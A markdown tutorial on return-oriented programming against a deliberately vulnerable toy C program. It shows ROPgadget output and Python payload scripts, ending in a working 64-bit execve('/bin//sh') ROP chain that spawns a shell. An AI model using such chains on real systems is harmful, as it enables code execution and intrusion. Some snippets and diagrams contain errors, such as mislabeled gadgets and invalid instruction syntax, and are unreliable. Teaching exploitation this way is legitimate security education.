# EXPLOITS
## STACK BUFFER OVERFLOW FOR RETURN ORIENTED PROGRAMMING (ROP)
## REQUIRED TO UNDERSTAND : Stack buffer overflow to overwrite registers backups especially to redirect code execution
## Can't work if : 
```
> PIE (position independant executable) is enabled
```
## Bypasses protection :
```
> NX (non executable) because we're not executing any shellcode
> ASLR because we don't jump to any libc function
```
Return Oriented Programming, also known as ROP is an exploitation technique which is based on the program code  
Think about it, Return oriented programming... Does it have to do anything with programming ?  
The answer is yes, it has, we're going to make a program based on program instructions, yes and ASLR won't change anything because the code is not randomized, so we can simply jump to the code, jumping instructions to instructions, instructions which can be placed in any zone in the code segment if you didn't understand, let's have a look of this code in assembly in 32 bits :
```asm
addr x+0 : int 0x80
addr x+4 : ret
addr x+8 : inc eax
addr x+12 : ret
addr x+16 xor eax, eax
addr x+20 : ret
addr x+24 : pop ebx
addr x+28 : ret
```
This code in a normal point of view is completely useless, this code makes no sense, but if you rembember, the instruction pointer can be set to any address if we got a stack buffer overflow... Let's think about it for a second, what exactly the ret instruction will do ? It will set EIP to toppest value in the the stack so we can chain instructions  
I don't know your point of view but when i see this code i can also see this :
```asm
addr x+16 : xor eax, eax # EAX => 0
ret
addr x+8 : inc eax # EAX => 1
ret
addr x24 : pop ebx # EBX => The toppest value in the stack
ret
addr x+0 : int 0x80
ret
```
These instructions finishing with a ret are called gadgets, even a simple ret instruction could be a gadget  
If we could chain these gadgets this way, we will set EAX to 1, set EBX to the toppest element in the stack and then we syscall, that's amazing because we called `sys_exit` !
`sys_exit` could be useless but imagine we could chain some instructions of an executable to get a shell ! Calling `execve` !  
That's basically what is return oriented programming  
So if, with a buffer overflow, we organize the stack like this :
```
[------------------]
[overflown buffer] => ...
(EBP) : (4 bytes) => Any value
(EIP) : (4 bytes) => The first instruction address in our ropchain => x+16 -> xor eax, eax
(4 bytes) => x+8 -> xor eax, eax
(4 bytes) => x+24 -> inc eax
(4 bytes) => The value that the pop ebx will pop => Any data (example : 0x00000009 (5))
(4 bytes) => x+0 -> int 0x80
[------------------]
```
When we would execute our ropchain, it will exit with the code 5 !
But... Yeah, it's possible if instructions we're looking for exists in the executable, otherwise it won't work, to know if it's the case there are a couple of ways, but we can use a really used tool called `ROPgadget`, to install it simply execute `pip install ROPgadget`  
Then we can search in the binary if there are the gadgets we're looking for, so let's compile this simple code :
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vuln()
{
	char buffer[64];
	scanf("%s", buffer);
}

int main(int argc, char ** argv) 
{
	vuln();
}
```
So we have a buffer overflow because of the scanf function here, okay, now let's use this to compile :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -m32
```
Let's first use the command to see all the available gadgets in the program :
```
ROPgadget --binary <executable>
```
It gived me :
```
(...)
0x000010c4 : push esp ; mov ebx, dword ptr [esp] ; ret
0x00001009 : ret
0x00001126 : ret 0x2eb3
0x000010e6 : ret 0x2ef3
0x0000100f : retf
0x0000115e : rol byte ptr [ebx + 0x5d8b10c4], cl ; cld ; leave ; ret
0x0000101a : sal byte ptr [edx + eax - 1], 0xd0 ; add esp, 8 ; pop ebx ; ret
0x00001155 : sal byte ptr [edx + ecx - 0x7d], cl ; in al, dx ; or byte ptr [eax + 0x51], dl ; call edx
0x000010b4 : sar bh, cl ; call dword ptr [eax + 0x51]
0x000010ad : sar bh, cl ; call dword ptr [eax - 0x73]
0x00001015 : sbb al, 0 ; add byte ptr [eax], al ; test eax, eax ; je 0x101f ; call eax
0x000010c7 : sbb al, 0x24 ; ret
0x000010b2 : sbb dword ptr [eax - 0x2e], -1 ; call dword ptr [eax + 0x51]
0x000011c3 : sti ; jmp 0x1120
0x00001083 : sti ; jmp dword ptr [ebx + 0x10]
0x00001063 : sti ; jmp dword ptr [ebx + 0x18]
0x00001073 : sti ; jmp dword ptr [ebx + 0xc]
0x00001043 : sti ; push 0 ; jmp 0x1030
0x00001053 : sti ; push 8 ; jmp 0x1030
0x000012a3 : sti ; ret
0x000012a6 : sub al, 0x24 ; ret
0x00001108 : sub esp, 0x14 ; push ecx ; call eax
0x00001158 : sub esp, 8 ; push eax ; push ecx ; call edx
0x00001019 : test eax, eax ; je 0x101f ; call eax
0x00001154 : test edx, edx ; je 0x1162 ; sub esp, 8 ; push eax ; push ecx ; call edx

Unique gadgets found: 149
```
We can see we have 149 gadgets in total  
To search a specific gadget, we can do :
```
ROPgadget --binary <executable> | grep "<instruction>"
# To be a gadget, the instruction has to have a ret instruction after it, like for example : mov eax, ebx ; ret
```
Now let's search for the first instruction of the ROPchain which is the `xor eax, eax` ! :
```
ROPgadget --binary <executable> | grep "xor eax, eax"
```
Uhhh, i got nothing, looks like the gadget doesn't exist... We actually need more gadgets, to do that, we can add the `-static` flag in gcc which tell to the compiler to add all the linked libraries functions directly in the code and not just referencing them in the libc, this way, we will get the gadgets from the libc library :
```
gcc <source code file.c> -o <executable> -fno-stack-protector -m32 -static
```
Okay now let's search again :
```
ROPgadget --binary <executable> | grep "xor eax, eax"
```
It gived a lot of gadgets, but to find the exact gadget we want we can do :
```
ROPgadget --binary <executable> | grep "xor eax, eax ; ret"
```
```
(...)
0x0804fcd0 : xor eax, eax ; ret
```
Awesome, we now that (for my binary) the address `0x0804fcd0` contains our first gadget, now let's do this for every gadget we need :
```
ROPgadget --binary vuln | grep "inc eax ; ret"
# it gived me : 0x0804f522 : inc eax ; ret
ROPgadget --binary vuln | grep "pop ebx ; ret"
# it gived me : 0x08049022 : pop ebx ; ret
ROPgadget --binary vuln | grep "int 0x80"
# it gived me : 0x0804a332 : int 0x80 (there is not "; ret" at the end but it's the last instruction so it doesn't matter because we will already exit the program)
```
Okay now if we organize the stack like this :
```
[------------------]
[overflown buffer] => ...
(EBP) => Any value
(EIP) => 0x0804fcd0
(EIP+4) => 0x0804f522
(EIP+8) => 0x08049022
(EIP+12) => The return code (example : 0x00000005)
(EIP+16) => 0x0804a332
[------------------]
```
It should be perfect, now let's build the exploit :
```python
# exploit.py
"""
This code will execute sys_exit 
sys_exit syscall : eax -> 1, ebx -> <RETURN VALUE>

"""
import struct
p = 'A'*64
p += 'B'*12
p += struct.pack('<I', 0x0804fcd0) # xor eax, eax ; eax = 0 # -> EIP BACKUP (start of our instruction chain)
p += struct.pack('<I', 0x0804f522) # inc eax # ; eax = 1    # -> EIP BACKUP + 4
p += struct.pack('<I', 0x08049022) # pop ebx                # -> EIP BACKUP + 8
p += struct.pack('<I', 0x00000005) # 05                     # -> EIP BACKUP + 12
p += struct.pack('<I', 0x0804a332) # int 0x80 ; syscall     # -> EIP BACKUP + 16

print(p)
```
Now let's execute this :
```
python exploit.py | ./vuln
```
If it didn't give any segmentation fault it means that it probably worked, let's check that by seeing the return code of the exit caused by the program :
```
echo $?
# gived -> 5
```
It worked !

Now, you can build your own ropchain doing different things depending on what gadget you have

Now there are some concepts that're useful doing return oriented programming :
* The write-what-write is a gadget that allows you to write in an address in memory  
To use it you need this gadget :
```asm
mov dword ptr [<register 1 (dst)>], <register 2 (src)>
; or mov qword ptr [<register 1 (dst)>], <register 2 (src)> for a 64 bits address
; where `<register 1>` and `<register 2>` are different, they could be eax, ebx, ecx or edx, you better not use pointers for `<register 1>`
```
This gadget will write the content of `<register 2>` to whatever memory address `<register 1>` is pointing to if it's writable, a memory segment that is always writable is the `.data` segment, you can get the `.data` segment address using : `readelf -S ./<executable> | grep " .data "` (the first address is the address of `.data`)  
So for example if you could do a ropchain as :
```python
# <ADDRESS> : 'I' for 32 bits address | 'Q' for 64 bits address
p += struct.pack('<ADDR TYPE>', <address>) # pop eax
p += struct.pack('<ADDR TYPE>', <.data address>) # The address of .data (example : 0x00000000004df0e0)
p += struct.pack('<ADDR TYPE>', <address>) # pop ebx
p += <WHATEVER YOU WANNA WRITE TO .data> # (In 4 bytes in 32 bits or 8 bytes in 64 bits, example : "P0WN")
p += pack('<ADDR TYPE>', <address>) # mov dword ptr [eax], [ebx]
```
This will write `<WHATEVER YOU WANNA WRITE TO .data>` in the `.data` segment  
If you want to write another bytes after these in .data :
```python
# <ADDR TYPE> : 'I' for 32 bits address | 'Q' for 64 bits address
p += struct.pack('<ADDR TYPE>', <address>) # pop eax
p += struct.pack('<ADDR TYPE>', <.data address>+<offset>) # The address of .data (example : 0x00000000004df0e0)
p += struct.pack('<ADDR TYPE>', <address>) # pop ebx
p += <WHATEVER YOU WANNA WRITE TO .data> # (In 4 bytes in 32 bits or 8 bytes in 64 bits, example : "P0WN")
p += pack('<ADDR TYPE>', <address>) # mov dword ptr [eax], [ebx]
```
`<offset>` : How many next bytes : So in 64 bits it's `8` and in 32 bits it's `4` then when want the next ones it's `8*2` (or `4*2` in 32 bits) ...
Here's an example that will write "POWNED!!LMAO" in the .data segment :
```python
def write_what_where(src, dest_addr, offset):
	# <ADDR TYPE> : 'I' for 32 bits address | 'Q' for 64 bits address
	p += struct.pack('<ADDR TYPE>', <address>) # pop eax
	p += struct.pack('<ADDR TYPE>', dest_addr+offset) # The address where to write plus the offset
	p += struct.pack('<ADDR TYPE>', <address>) # pop ebx
	p += src # (In 4 bytes in 32 bits and 8 bytes in 64 bits, example : "P0WN")
	p += pack('<ADDR TYPE>', <address>) # mov dword ptr [eax], [ebx]

write_what_where("POWN", <.data address>, 0)
write_what_where("ED!!", <.data address>, 4) # Or 8 in 64 bits
write_what_where("LMAO", <.data address>, 8) # Or 16 in 64 bits
```
* The read-fromwhere-towhere gadget is a gadget that will read from an address to a register  
To use it you need this gadget :
```asm
mov <register 1 (dst) >, dword ptr [<register 2 (src)>]
; or mov <register 1 (dst) >, qword ptr [<register 2 (src)>] for a 64 bits address
```
Approximatively the same thing for the write-what-where gadget but registers usage is reversed

* pop `<register>` is a gadget that can give us full control on `<register>`, to set <register> :
```python
p += struct.pack("<ADDR TYPE>", <address>) # pop <register>
p += <CONTENT OF <register>>
... # The next gadgets...
```

To get a shell, there is a simple command that already do it for us in ROPgadget, i don't know why but when we execute in 32 bits it doesn't work for me :
```
ROPgadget --binary <executable> --ropchain
```
```
Unique gadgets found: 39094

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x805f4d2 mov dword ptr [edx], eax ; ret
	[+] Gadget found: 0x805e799 pop edx ; pop ebx ; ret
	[+] Gadget found: 0x80ca69a pop eax ; ret
	[+] Gadget found: 0x804fcd0 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x804fcd0 xor eax, eax ; ret
	[+] Gadget found: 0x804f522 inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x8049022 pop ebx ; ret
	[-] Can't find the 'pop ecx' instruction

```
We don't get the good gadgets to gain shell 
But in 64 bits we do, so i'm gonna compile it removing the `-m32` flag and see what it will find enough gadgets :
```
gcc main.c -o vuln -fno-stack-protector -static
```
```
ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

	[+] Gadget found: 0x499285 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x40f37e pop rsi ; ret
	[+] Gadget found: 0x451897 pop rax ; ret
	[+] Gadget found: 0x44bab0 xor rax, rax ; ret

- Step 2 -- Init syscall number gadgets

	[+] Gadget found: 0x44bab0 xor rax, rax ; ret
	[+] Gadget found: 0x48e390 add rax, 1 ; ret
	[+] Gadget found: 0x48e391 add eax, 1 ; ret

- Step 3 -- Init syscall arguments gadgets

	[+] Gadget found: 0x40183a pop rdi ; ret
	[+] Gadget found: 0x40f37e pop rsi ; ret
	[+] Gadget found: 0x40173f pop rdx ; ret

- Step 4 -- Syscall gadget

	[+] Gadget found: 0x4012e3 syscall

- Step 5 -- Build the ROP chain

	#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<Q', 0x000000000040f37e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004df0e0) # @ .data
	p += pack('<Q', 0x0000000000451897) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', 0x0000000000499285) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040f37e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004df0e8) # @ .data + 8
	p += pack('<Q', 0x000000000044bab0) # xor rax, rax ; ret
	p += pack('<Q', 0x0000000000499285) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', 0x000000000040183a) # pop rdi ; ret
	p += pack('<Q', 0x00000000004df0e0) # @ .data
	p += pack('<Q', 0x000000000040f37e) # pop rsi ; ret
	p += pack('<Q', 0x00000000004df0e8) # @ .data + 8
	p += pack('<Q', 0x000000000040173f) # pop rdx ; ret
	p += pack('<Q', 0x00000000004df0e8) # @ .data + 8
	p += pack('<Q', 0x000000000044bab0) # xor rax, rax ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x000000000048e390) # add rax, 1 ; ret
	p += pack('<Q', 0x00000000004012e3) # syscall
```
So yeah, it found enough gadgets in the 64 bits, when it says :
```
Unique gadgets found: 48005
```
And in 32 bits :
```
Unique gadgets found: 39094
```
In 64 bits, there are way more gadgets than in 32 bits

The code that it gived me is not working, but this one does :
```python
#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here

data_section_addr = 0x00000000004c00e0 # Data segment/section start address | shell command : readelf -S ./vuln | grep " .data " -> [21] .data PROGBITS 00000000004c00e0 000bf0e0

p = 'A'*64+'B'*8 #overflow

p += pack('<Q', 0x000000000040f39e) # pop rsi ; ret | shell command : ROPgadget --binary ./vuln | grep "pop rsi ; ret" -> 0x000000000040f39e : pop rsi ; ret 
p += pack('<Q', data_section_addr) # @ .data 
p += pack('<Q', 0x0000000000449267) # pop rax ; ret | shell command : ROPgadget --binary ./vuln | grep "pop rax ; ret" -> 0x0000000000449267 : pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047b785) # mov qword ptr [rsi], rax ; ret | ...
p += pack('<Q', 0x000000000040f39e) # pop rsi ; ret | ...
p += pack('<Q', data_section_addr + 8) # @ .data + 8
p += pack('<Q', 0x00000000004438c0) # xor rax, rax ; ret | ...
p += pack('<Q', 0x000000000047b785) # mov qword ptr [rsi], rax ; ret | ...
p += pack('<Q', 0x000000000040186a) # pop rdi ; ret | ...
p += pack('<Q', data_section_addr) # @ .data
p += pack('<Q', 0x000000000040f39e) # pop rsi ; ret | ...
p += pack('<Q', data_section_addr + 8) # @ .data + 8
p += pack('<Q', 0x000000000040176f) # pop rdx ; ret | ...
p += pack('<Q', data_section_addr + 8) # @ .data + 8
p += pack('<Q', 0x00000000004438c0) # xor rax, rax ; ret | ...
i = 1
while i < 60:
	p += pack('<Q', 0x00000000004707b0) # add rax, 1 ; ret | ... ...
	i += 1

p += pack('<Q', 0x00000000004012d3) # syscall | shell command : ROPgadget --binary ./vuln | grep "syscall" -> 0x00000000004012d3 : syscall

print p
```
